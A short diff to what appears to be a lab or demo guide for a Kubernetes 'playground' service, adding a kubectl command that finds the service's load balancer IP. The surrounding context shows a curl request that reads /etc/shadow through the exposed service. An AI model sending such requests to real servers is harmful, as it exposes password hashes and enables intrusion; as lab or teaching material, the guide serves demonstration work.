@@ -1,3 +1,7 @@
+# Find out url:port
+LOAD_BALANCER_URL=$(kubectl get svc playground -n default -o json | jq -r .status.loadBalancer.ingress[].ip)
+PORT=80
+
 # Read the file /etc/shadow
 ```
 curl $LOAD_BALANCER_URL:$PORT/etc/shadow
